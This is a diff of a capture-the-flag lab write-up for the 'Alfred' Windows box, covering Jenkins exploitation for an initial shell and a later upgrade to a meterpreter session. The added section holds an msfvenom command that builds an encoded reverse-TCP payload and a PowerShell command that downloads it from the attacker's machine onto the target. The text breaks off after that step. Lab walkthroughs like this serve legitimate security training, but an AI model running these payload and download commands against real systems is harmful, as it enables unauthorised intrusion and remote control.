@@ -1,5 +1,3 @@
-# Alfred
-
 
 Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
 
@@ -9,6 +7,7 @@ Exploit Jenkins to gain an initial shell, then escalate your privileges by explo
 
 We will be exploiting this box today. According to the brief overview this is a windows application and it is recommended that we use the [Nishang](https://github.com/samratashok/nishang) project to gain initial access. Also they specified that we use this [specific script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
+# Initial Access
 ## How many ports are open? (TCP only)
 
 ### Enumeration
@@ -101,4 +100,36 @@ Copy the above command to the configure section as discussed above and when done
 ![[Pasted image 20251013220253.png]]
 
 lets find the user.txt file now
+
+use the following to quickly find a text file using powershell query
+```shell
+Get-ChildItem -Path C:\ -Filter "user.txt" -Recurse -ErrorAction SilentlyContinue
+```
+![[Pasted image 20251013220613.png]]
+### Read the file once found
+
+```powershell
+Get-Content C:\Users\bill\Desktop\user.txt
+# or
+type C:\Users\bill\Desktop\user.txt
+```
+![[Pasted image 20251013220646.png]]
+
+# Switching Shells
+
+Time to upgrade our shells from a simple netcat shell to a meterpreter shell
+## Generate the MSFVenom Payload
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
+```
+## Download the payload on the webserver 
+1. We already have our python server running
+2. Lets download it from our attacker machine onto the webserver using the below command
+
+```shell
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.75:8000/shell-name.exe','shell-name.exe')"
+```
+
+
 
